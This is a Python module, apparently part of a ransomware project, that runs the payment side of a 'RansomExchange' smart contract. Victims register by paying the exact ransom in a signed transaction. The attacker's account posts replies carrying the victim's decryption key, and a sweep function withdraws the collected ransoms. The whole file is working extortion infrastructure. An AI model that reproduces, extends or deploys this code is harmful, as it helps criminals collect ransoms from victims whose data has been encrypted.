"""Talking to the RansomExchange contract: signed transactions over JSON-RPC.

It uses only eth-account plus plain JSON-RPC over HTTP: calldata is encoded
with eth_abi, transactions are signed locally with a decrypted keystore key,
and submitted through the chain's RPC.

The contract itself enforces payment (the exact ransom) and attacker-only
replies; this module never bypasses those checks, it only speaks the ABI.
"""

import json
import time
from pathlib import Path
from urllib.request import Request, urlopen

from eth_account import Account
from eth_abi import decode as abi_decode, encode as abi_encode
from eth_utils import keccak

from . import wallet

SELECTOR_REGISTER = keccak(text="registerVictim(bytes)")[:4]
SELECTOR_SUBMIT_REPLY = keccak(text="submitReply(uint256,bytes)")[:4]
SELECTOR_GET_REPLY = keccak(text="getReply(uint256)")[:4]
SELECTOR_REQUESTS = keccak(text="requests(uint256)")[:4]
SELECTOR_ATTACKER = keccak(text="attacker()")[:4]
EVENT_REGISTERED = keccak(text="VictimRegistered(uint256,address)")

# Storing ~1.4 KB of sealed blob per request costs roughly 1M gas in
# SSTORE writes; the reply carries the victim_priv PEM in plaintext (~1.7 KB)
# and costs ~1.2M. Keep both well below the chain's block gas limit.
GAS_REGISTER = 3000000
GAS_REPLY = 4000000
POLL_SECONDS = 5
RECEIPT_TIMEOUT = 120


def discover_contract(config: dict) -> str:
    """Read the deployed contract address from the utility server."""
    url = f"{config['utility_url']}/contracts_info?name={config['contract_name']}"
    request = Request(url, headers={"Content-Type": "application/json"})
    with urlopen(request, timeout=5) as response:
        result = json.load(response)

    address = None
    if isinstance(result, str):
        address = result
    elif isinstance(result, dict):
        entry = result.get(config["contract_name"], result.get("address"))
        if isinstance(entry, dict):
            address = entry.get("contractAddress") or entry.get("address")
        else:
            address = entry
    if not address:
        raise RuntimeError("utility server returned no contract address")
    return wallet.validate_address(address)


def load_wallet_key(keystore_path: Path, password: str) -> Account:
    """Decrypt a wallet keystore in memory; the key never touches disk."""
    keystore = json.loads(Path(keystore_path).read_text(encoding="utf-8"))
    return Account.from_key(Account.decrypt(keystore, password))


def load_account(account_file: Path) -> Account:
    """Load the operator's account: {"address": ..., "private_key": ...}."""
    record = json.loads(Path(account_file).read_text(encoding="utf-8"))
    return Account.from_key(record["private_key"])


def send_tx(config: dict, account: Account, to: str, value: int, data: bytes, gas: int):
    """Build, sign, and submit one real transaction; return its hash."""
    nonce = int(
        wallet.rpc(config, "eth_getTransactionCount", [account.address, "pending"]), 16
    )
    gas_price = int(wallet.rpc(config, "eth_gasPrice", []), 16)
    tx = {
        "to": to,
        "value": value,
        "gas": gas,
        "gasPrice": gas_price,
        "nonce": nonce,
        "chainId": config["chain_id"],
        "data": data,
    }
    signed = account.sign_transaction(tx)
    raw = getattr(signed, "raw_transaction", None) or signed.rawTransaction
    return wallet.rpc(config, "eth_sendRawTransaction", ["0x" + raw.hex()])


def wait_receipt(config: dict, tx_hash: str, timeout: int = RECEIPT_TIMEOUT) -> dict:
    """Poll for the transaction receipt; no result before it is mined."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        receipt = wallet.rpc(config, "eth_getTransactionReceipt", [tx_hash])
        if receipt is not None:
            if int(receipt["status"], 16) != 1:
                raise RuntimeError(f"transaction reverted on-chain: {tx_hash}")
            return receipt
        time.sleep(POLL_SECONDS)
    raise TimeoutError(f"receipt not seen within {timeout}s: {tx_hash}")


def call(config: dict, to: str, selector: bytes, arg: int = None, out_types: list = None):
    """One eth_call. None when it reverted or came back empty.

    A revert is an expected signal while polling: getReply reverts until the
    operator answers. The callers only ever treat None as "nothing yet".
    """
    data = "0x" + (selector + (abi_encode(["uint256"], [arg]) if arg is not None else b"")).hex()
    try:
        result = wallet.rpc(config, "eth_call", [{"to": to, "data": data}, "latest"])
    except RuntimeError as error:
        if "execution reverted" in str(error):
            return None
        raise
    if result in (None, "0x") or len(result) < 10:
        return None
    return abi_decode(out_types, bytes.fromhex(result[2:]))


def contract_attacker(config: dict, contract: str) -> str:
    """The account the contract lets answer requests."""
    return call(config, contract, SELECTOR_ATTACKER, out_types=["address"])[0]


def register_request(config: dict, wallet_file: Path, password: str, request_path: Path) -> dict:
    """Post one paid registration transaction for the saved request.

    Sends registerVictim with exactly the ransom attached; the contract
    reverts otherwise. Returns the request record, with its on-chain id.
    """
    request = json.loads(Path(request_path).read_text(encoding="utf-8"))
    address = discover_contract(config)
    # Never attach value to a target without code: a failed deployment leaves
    # a dead address, and a payment to it would be a silent, unrecoverable donation.
    code = wallet.rpc(config, "eth_getCode", [address, "latest"])
    if len(code) <= 2:
        raise RuntimeError(
            f"no contract code at {address}; the deployment failed. "
            "Refusing to pay a ransom into a dead address."
        )
    account = load_wallet_key(wallet_file, password)

    sealed_blob = json.dumps(request["victim_priv_sealed"]).encode("utf-8")
    data = SELECTOR_REGISTER + abi_encode(["bytes"], [sealed_blob])
    tx_hash = send_tx(
        config, account, address, value=config["ransom_wei"], data=data, gas=GAS_REGISTER
    )
    receipt = wait_receipt(config, tx_hash)
    request_id = extract_request_id(receipt)

    request.update(
        {
            "transaction_hash": tx_hash,
            "contract_address": address,
            "request_id": request_id,
            "status": "REGISTERED",
        }
    )
    Path(request_path).write_text(json.dumps(request, indent=2) + "\n", encoding="utf-8")
    return request


def extract_request_id(receipt: dict) -> int:
    """Read the VictimRegistered event id from the receipt logs."""
    for log in receipt.get("logs", []):
        topics = log.get("topics", [])
        if topics and bytes.fromhex(topics[0][2:]) == EVENT_REGISTERED:
            return int(topics[1], 16)
    raise RuntimeError("registration receipt had no VictimRegistered event")


def wait_reply(config: dict, request_id: int, deadline_seconds: int = 600) -> dict:
    """Poll getReply on-chain until the operator's reply appears."""
    address = discover_contract(config)
    deadline = time.monotonic() + deadline_seconds
    while time.monotonic() < deadline:
        result = call(config, address, SELECTOR_GET_REPLY, request_id, ["bytes"])
        if result and result[0]:
            return json.loads(result[0].decode("utf-8"))
        time.sleep(POLL_SECONDS)
    raise TimeoutError("no reply posted on-chain in time")


def requests_on_chain(config: dict, start_id: int = 0) -> list:
    """Every request on the chain, with its payment and answer state."""
    address = discover_contract(config)
    found = []
    next_id = start_id
    while True:
        result = call(
            config, address, SELECTOR_REQUESTS, next_id, ["address", "bytes", "bool"],
        )
        if result is None:
            break
        victim, sealed_blob, answered = result
        if victim == "0x" + "0" * 40:
            break  # unmapped id: end of registered requests
        found.append(
            {
                "id": next_id,
                "victim": victim,
                "sealed_blob_json": bytes(sealed_blob).decode("utf-8"),
                "answered": answered,
            }
        )
        next_id += 1
    return found


def post_reply(config: dict, account_file: Path, request_id: int, reply: bytes) -> str:
    """The operator posts the reply for one paid, unanswered request.

    The contract only accepts this from its own attacker account, so that is
    checked first: a stale key would only burn gas on a guaranteed revert.
    """
    account = load_account(account_file)
    address = discover_contract(config)
    onchain = contract_attacker(config, address)
    if onchain.lower() != account.address.lower():
        raise RuntimeError(
            f"this key ({account.address}) is not the contract's attacker "
            f"({onchain}). The chain key file is out of date."
        )
    data = SELECTOR_SUBMIT_REPLY + abi_encode(["uint256", "bytes"], [request_id, reply])
    tx_hash = send_tx(config, account, address, value=0, data=data, gas=GAS_REPLY)
    wait_receipt(config, tx_hash)
    return tx_hash


def sweep(config: dict, account_file: Path) -> str:
    """The operator takes the collected ransoms out of the contract."""
    account = load_account(account_file)
    tx_hash = send_tx(config, account, discover_contract(config), value=0,
                      data=keccak(text="withdraw()")[:4], gas=100000)
    wait_receipt(config, tx_hash)
    return tx_hash
